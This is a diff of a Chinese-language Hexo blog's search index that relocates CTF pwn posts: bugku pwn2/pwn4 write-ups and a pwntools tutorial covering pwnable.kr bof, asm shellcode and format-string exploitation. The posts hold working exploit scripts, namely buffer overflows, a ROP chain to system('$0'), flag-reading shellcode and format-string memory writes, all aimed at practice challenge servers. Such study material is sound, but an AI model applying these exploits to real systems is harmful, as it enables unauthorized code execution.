@@ -1,51 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>bugku pwn</title>
-    <url>/2019/12/25/bugku/</url>
-    <content><![CDATA[<h1 id="bugku-pwn"><a href="#bugku-pwn" class="headerlink" title="bugku pwn"></a>bugku pwn</h1><a id="more"></a>
-<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><ul>
-<li>checksec发现什么保护都没有,拖进ida看看.<br>main函数<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-30h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x30uLL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  puts(&quot;say something?&quot;);</span><br><span class="line">  read(0, &amp;s, 0x100uLL);</span><br><span class="line">  puts(&quot;oh,that&apos;s so boring!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>get_shell_函数:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int get_shell_()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;);</span><br><span class="line">  puts(&quot;this is your flag!&quot;);</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>应该是让返回地址覆盖成getshell地址，<br>gdb看一下偏移</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb</span><br><span class="line">file pwn2</span><br><span class="line">break read</span><br><span class="line">start</span><br><span class="line">ni</span><br><span class="line">continue</span><br><span class="line">pattern create 100</span><br><span class="line">step</span><br><span class="line">pattern offset bAA1</span><br><span class="line">print get_shell_</span><br></pre></td></tr></table></figure>
-
-<p>rbp前四位为bAA1，算一下偏移<br>到rbp偏移为48，向上8字节是父函数rbp，所以偏移56覆盖到返回地址，get_shell_地址为<br>exp如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&apos;114.116.54.89&apos;,&apos;10003&apos;)</span><br><span class="line">payload=&apos;a&apos;*48+&apos;a&apos;*8+p64(0x400751)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><ul>
-<li>checksec跑一下,并没有什么壳或保护.<br>ida64位打开一下,虽然有一个read函数,可以输入30字节,10字节的缓冲区可以制造溢出.但是没有系统函数可以调用.<br><code>shift+f12</code>查看有没有可疑字符串，然后在字符串上按<code>x</code>查看引用他的地方，找到了一个system函数.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_400751()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;ok~you find me,but you can&apos;t get my shell&apos;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>但是system函数里面的字符串并不是我们想要的<code>&#39;/bin/sh&#39;</code>,尝试用ROPgadget去搜索，命令为<code>ROPgadget --binary pwn4 --string &#39;/bin/sh&#39;</code>，搜索无果。。。再回到IDA中检测字符串</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0000000000601100	00000022	C	4985y9y()DY)*YFG8yas08d976s08d7$0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>发现了一个<code>$0</code>，<code>$0</code>在linux中为为shell或shell脚本的名称。<br><code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/sh -c string</code>来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。所以如果将<code>$0</code>作为<code>system</code>的参数，能达到传入<code>&#39;/bin/sh&#39;</code>一样的效果。</p>
-</li>
-<li><p>有了<code>system</code>函数和<code>$0</code>作为参数，就可以进行溢出了。</p>
-</li>
-<li><p>还有要注意的就是64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p>
-</li>
-</ul>
-<p>我们利用<code>ROPgadget</code>工具进行查找，得到<code>pop rdi ; ret</code>和<code>$0</code>的地址,system的地址直接在IDA中查看.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn4 --only &apos;pop|ret&apos;</span><br><span class="line">ROPgadget --binary pwn4 --string &apos;\$0&apos;</span><br></pre></td></tr></table></figure>
-
-<p>首先先填充缓冲区，大小为0x10，然后覆盖rbp，8个字节，传入pop rdi;ret的地址和$0,将栈中$0的地址弹出，存入rdi作为参数，在传入system地址进行调用。<br>下面是脚本:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">conn = remote(&apos;114.116.54.89&apos;, 10004)</span><br><span class="line"># conn = process(&apos;./pwn4&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004007d3 </span><br><span class="line">bin_sh = 0x000000000060111f</span><br><span class="line">system = 0x000000000040075A</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos; * (0x10+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)  </span><br><span class="line"></span><br><span class="line">conn.recvuntil(&apos;Come on,try to pwn me&apos;)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>heap</title>
     <url>/2019/12/25/heap/</url>
     <content><![CDATA[<h1 id="pwn-heap"><a href="#pwn-heap" class="headerlink" title="pwn-heap"></a>pwn-heap</h1><a id="more"></a>
@@ -344,7 +299,52 @@
 <p>当 req=24 时，request2size(24)=32。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</p>
 ]]></content>
       <tags>
-        <tag>heap</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku pwn</title>
+    <url>/2019/12/25/bugku/</url>
+    <content><![CDATA[<h1 id="bugku-pwn"><a href="#bugku-pwn" class="headerlink" title="bugku pwn"></a>bugku pwn</h1><a id="more"></a>
+<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><ul>
+<li>checksec发现什么保护都没有,拖进ida看看.<br>main函数<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-30h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x30uLL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  puts(&quot;say something?&quot;);</span><br><span class="line">  read(0, &amp;s, 0x100uLL);</span><br><span class="line">  puts(&quot;oh,that&apos;s so boring!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>get_shell_函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int get_shell_()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;);</span><br><span class="line">  puts(&quot;this is your flag!&quot;);</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>应该是让返回地址覆盖成getshell地址，<br>gdb看一下偏移</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb</span><br><span class="line">file pwn2</span><br><span class="line">break read</span><br><span class="line">start</span><br><span class="line">ni</span><br><span class="line">continue</span><br><span class="line">pattern create 100</span><br><span class="line">step</span><br><span class="line">pattern offset bAA1</span><br><span class="line">print get_shell_</span><br></pre></td></tr></table></figure>
+
+<p>rbp前四位为bAA1，算一下偏移<br>到rbp偏移为48，向上8字节是父函数rbp，所以偏移56覆盖到返回地址，get_shell_地址为<br>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&apos;114.116.54.89&apos;,&apos;10003&apos;)</span><br><span class="line">payload=&apos;a&apos;*48+&apos;a&apos;*8+p64(0x400751)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><ul>
+<li>checksec跑一下,并没有什么壳或保护.<br>ida64位打开一下,虽然有一个read函数,可以输入30字节,10字节的缓冲区可以制造溢出.但是没有系统函数可以调用.<br><code>shift+f12</code>查看有没有可疑字符串，然后在字符串上按<code>x</code>查看引用他的地方，找到了一个system函数.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_400751()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;ok~you find me,but you can&apos;t get my shell&apos;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>但是system函数里面的字符串并不是我们想要的<code>&#39;/bin/sh&#39;</code>,尝试用ROPgadget去搜索，命令为<code>ROPgadget --binary pwn4 --string &#39;/bin/sh&#39;</code>，搜索无果。。。再回到IDA中检测字符串</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0000000000601100	00000022	C	4985y9y()DY)*YFG8yas08d976s08d7$0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>发现了一个<code>$0</code>，<code>$0</code>在linux中为为shell或shell脚本的名称。<br><code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/sh -c string</code>来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。所以如果将<code>$0</code>作为<code>system</code>的参数，能达到传入<code>&#39;/bin/sh&#39;</code>一样的效果。</p>
+</li>
+<li><p>有了<code>system</code>函数和<code>$0</code>作为参数，就可以进行溢出了。</p>
+</li>
+<li><p>还有要注意的就是64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p>
+</li>
+</ul>
+<p>我们利用<code>ROPgadget</code>工具进行查找，得到<code>pop rdi ; ret</code>和<code>$0</code>的地址,system的地址直接在IDA中查看.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn4 --only &apos;pop|ret&apos;</span><br><span class="line">ROPgadget --binary pwn4 --string &apos;\$0&apos;</span><br></pre></td></tr></table></figure>
+
+<p>首先先填充缓冲区，大小为0x10，然后覆盖rbp，8个字节，传入pop rdi;ret的地址和$0,将栈中$0的地址弹出，存入rdi作为参数，在传入system地址进行调用。<br>下面是脚本:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">conn = remote(&apos;114.116.54.89&apos;, 10004)</span><br><span class="line"># conn = process(&apos;./pwn4&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004007d3 </span><br><span class="line">bin_sh = 0x000000000060111f</span><br><span class="line">system = 0x000000000040075A</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos; * (0x10+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)  </span><br><span class="line"></span><br><span class="line">conn.recvuntil(&apos;Come on,try to pwn me&apos;)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -517,6 +517,57 @@
 <li>fd == 0时：则表示标准输入；</li>
 <li>fd == 1时：则表示 标准输出；</li>
 <li>fd == 2时，则表示标准输出错误。<br>buf 表示读入的缓冲区；<br>32表示读入32字节；<br>所以我们 只需要 使 fd == 0 ，则我们就能自己输入 LETMEWIN 到 buf中。这样最终得到flag。<br>那么我们就要令<code>argv[1] = 0x1234</code>即 <code>argv[1] = 4660</code>.</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwntools</title>
+    <url>/2019/12/25/pwntools/</url>
+    <content><![CDATA[<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><ul>
+<li><p>pwntools是一个二进制利用框架。(别问我为什么转pwn,web打不下去了好吧)可以方便有效的帮助我们编写exp。</p>
+<a id="more"></a>
+<h2 id="Pwntools的“Hello-World”"><a href="#Pwntools的“Hello-World”" class="headerlink" title="Pwntools的“Hello World”"></a>Pwntools的“Hello World”</h2></li>
+<li><p>栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">    char overflowme[32];</span><br><span class="line">    printf(&quot;overflow me : &quot;);</span><br><span class="line">    gets(overflowme);    // smash me!</span><br><span class="line">    if(key == 0xcafebabe)&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        printf(&quot;Nah..\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">    func(0xdeadbeef);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>pwntools脚本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = remote(&quot;pwnable.kr&quot;, 9000)</span><br><span class="line">c.sendline(&quot;AAAA&quot; * 13 + p32(0xcafebabe))</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>源码简洁明了，我们只需要将key改写成0xcafebabe。</p>
+<p>现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。</p>
+<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code>会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 c). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
+<ul>
+<li><code>send(payload)</code> 发送payload</li>
+<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾\n）</li>
+<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
+<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
+<li><code>recvline()</code> 接收一行输出</li>
+<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
+<li><code>recvuntil(some_string)</code> 接收到 some_string 为止<br>在第三行中,<code>p32()</code>可以让我们转换整数到小端序格式. <code>p32</code>转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字. <code>c.sendline</code> 将我们的payload发送到远程主机. <code>&quot;AAAA&quot; * 14</code> 是我们到key的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。<h2 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h2>下一题是pwnable.kr的asm. 你需要用 ssh -p2222 <a href="mailto:asm@pwnable.kr" target="_blank" rel="noopener">asm@pwnable.kr</a> 并输入密码 guest 来查看可执行文件和源码. 这里，我们只展示利用代码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./asm&quot;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"> </span><br><span class="line">shellcode = shellcraft.amd64.pushstr(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.amd64.linux.open(&apos;rsp&apos;,0,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.read(&apos;rax&apos;,&apos;rsp&apos;,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.write(1, &apos;rsp&apos;, 100)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&apos;shellcode: &apos;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">log.success(p.recvall())</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>我们这里用到了新的api: <code>process()</code>, <code>contex.log_level</code>, <code>gdb.attach</code>, 和 <code>shellcraft</code>.<br>提醒一下，如果你想在命令行中使用<code>gdb.attach()</code>, 便需要安装并运行 tmux.<br><code>process</code> 和 <code>remote</code> 类似. remote 连接远程主机, process 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, process 返回的对象可以通过 gdb.attach(p) 将进程attach到gdb上. Attach 之后, gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).<br>shellcraft 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 open 了一个文件并 read 文件到 stdout.</p>
+<h2 id="格式化漏洞自动化"><a href="#格式化漏洞自动化" class="headerlink" title="格式化漏洞自动化"></a>格式化漏洞自动化</h2><p>我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import tempfile</span><br><span class="line"> </span><br><span class="line">program = tempfile.mktemp()</span><br><span class="line">source  = program + &quot;.c&quot;</span><br><span class="line">write(source, &apos;&apos;&apos;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#define MEMORY_ADDRESS ((void*)0x11111000)</span><br><span class="line">#define MEMORY_SIZE 1024</span><br><span class="line">#define TARGET ((int *) 0x11111110)</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">       char buff[1024];</span><br><span class="line">       void *ptr = NULL;</span><br><span class="line">       int *my_var = TARGET;</span><br><span class="line">       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</span><br><span class="line">       if(ptr != MEMORY_ADDRESS)</span><br><span class="line">       &#123;</span><br><span class="line">               perror(&quot;mmap&quot;);</span><br><span class="line">               return EXIT_FAILURE;</span><br><span class="line">       &#125;</span><br><span class="line">       *my_var = 0x41414141;</span><br><span class="line">       write(1, &amp;my_var, sizeof(int *));</span><br><span class="line">       scanf(&quot;%s&quot;, buff);</span><br><span class="line">       dprintf(2, buff);</span><br><span class="line">       write(1, my_var, sizeof(int));</span><br><span class="line">       return 0;</span><br><span class="line">&#125;&apos;&apos;&apos;)</span><br><span class="line">cmdline = [&quot;gcc&quot;, source, &quot;-Wno-format-security&quot;, &quot;-m32&quot;, &quot;-o&quot;, program]</span><br><span class="line">process(cmdline).wait_for_close()</span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    return p.recvall()</span><br><span class="line"> </span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line">p = process(program, stderr=PIPE)</span><br><span class="line">addr = u32(p.recv(4))</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: 0x1337babe&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print hex(unpack(p.recv(4)))</span><br></pre></td></tr></table></figure>
+
+<p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址:<code>{address1: value1, address2:value2,..., address: valueN}</code>.</p>
+<p>有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload .<br><a href="http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload</a></p>
+<h2 id="使用-ELF"><a href="#使用-ELF" class="headerlink" title="使用 ELF()"></a>使用 ELF()</h2><p>有些题目给了我们libc. 用 <code>gdb&gt; x function1 — function2</code> 算偏移量太麻烦了, 因此有了 <code>ELF</code>.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">e = ELF(&apos;./example_file&apos;)</span><br><span class="line">print hex(e.address)  # 0x400000</span><br><span class="line">print hex(e.symbols[&apos;write&apos;]) # 0x401680</span><br><span class="line">print hex(e.got[&apos;write&apos;]) # 0x60b070</span><br><span class="line">print hex(e.plt[&apos;write&apos;]) # 0x401680</span><br><span class="line">offset = e.symbols[&apos;system&apos;] - e.symbols[&apos;printf&apos;] # calculate offset</span><br><span class="line">binsh_address = next(e.search(&apos;/bin/sh\x00&apos;)) # find address which contains /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>和 process() 一样, 我们只用将路径给 ELF(path) 即可分析 ELF.</p>
+<p>我们有以下几种方法操纵ELF:</p>
+<ul>
+<li>symbols[‘a_function’] 找到 a_function 的地址</li>
+<li>got[‘a_function’] 找到 a_function的 got</li>
+<li>plt[‘a_function’] 找到 a_function 的 plt</li>
+<li>next(e.search(“some_characters”)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址.</li>
 </ul>
 ]]></content>
       <tags>
@@ -749,57 +800,6 @@
 ]]></content>
       <tags>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwntools</title>
-    <url>/2019/12/25/pwntools/</url>
-    <content><![CDATA[<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><ul>
-<li><p>pwntools是一个二进制利用框架。(别问我为什么转pwn,web打不下去了好吧)可以方便有效的帮助我们编写exp。</p>
-<a id="more"></a>
-<h2 id="Pwntools的“Hello-World”"><a href="#Pwntools的“Hello-World”" class="headerlink" title="Pwntools的“Hello World”"></a>Pwntools的“Hello World”</h2></li>
-<li><p>栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">    char overflowme[32];</span><br><span class="line">    printf(&quot;overflow me : &quot;);</span><br><span class="line">    gets(overflowme);    // smash me!</span><br><span class="line">    if(key == 0xcafebabe)&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        printf(&quot;Nah..\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">    func(0xdeadbeef);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>pwntools脚本：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = remote(&quot;pwnable.kr&quot;, 9000)</span><br><span class="line">c.sendline(&quot;AAAA&quot; * 13 + p32(0xcafebabe))</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>源码简洁明了，我们只需要将key改写成0xcafebabe。</p>
-<p>现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。</p>
-<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code>会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 c). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
-<ul>
-<li><code>send(payload)</code> 发送payload</li>
-<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾\n）</li>
-<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
-<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
-<li><code>recvline()</code> 接收一行输出</li>
-<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
-<li><code>recvuntil(some_string)</code> 接收到 some_string 为止<br>在第三行中,<code>p32()</code>可以让我们转换整数到小端序格式. <code>p32</code>转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字. <code>c.sendline</code> 将我们的payload发送到远程主机. <code>&quot;AAAA&quot; * 14</code> 是我们到key的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。<h2 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h2>下一题是pwnable.kr的asm. 你需要用 ssh -p2222 <a href="mailto:asm@pwnable.kr" target="_blank" rel="noopener">asm@pwnable.kr</a> 并输入密码 guest 来查看可执行文件和源码. 这里，我们只展示利用代码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./asm&quot;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"> </span><br><span class="line">shellcode = shellcraft.amd64.pushstr(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.amd64.linux.open(&apos;rsp&apos;,0,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.read(&apos;rax&apos;,&apos;rsp&apos;,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.write(1, &apos;rsp&apos;, 100)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&apos;shellcode: &apos;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">log.success(p.recvall())</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>我们这里用到了新的api: <code>process()</code>, <code>contex.log_level</code>, <code>gdb.attach</code>, 和 <code>shellcraft</code>.<br>提醒一下，如果你想在命令行中使用<code>gdb.attach()</code>, 便需要安装并运行 tmux.<br><code>process</code> 和 <code>remote</code> 类似. remote 连接远程主机, process 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, process 返回的对象可以通过 gdb.attach(p) 将进程attach到gdb上. Attach 之后, gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).<br>shellcraft 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 open 了一个文件并 read 文件到 stdout.</p>
-<h2 id="格式化漏洞自动化"><a href="#格式化漏洞自动化" class="headerlink" title="格式化漏洞自动化"></a>格式化漏洞自动化</h2><p>我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import tempfile</span><br><span class="line"> </span><br><span class="line">program = tempfile.mktemp()</span><br><span class="line">source  = program + &quot;.c&quot;</span><br><span class="line">write(source, &apos;&apos;&apos;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#define MEMORY_ADDRESS ((void*)0x11111000)</span><br><span class="line">#define MEMORY_SIZE 1024</span><br><span class="line">#define TARGET ((int *) 0x11111110)</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">       char buff[1024];</span><br><span class="line">       void *ptr = NULL;</span><br><span class="line">       int 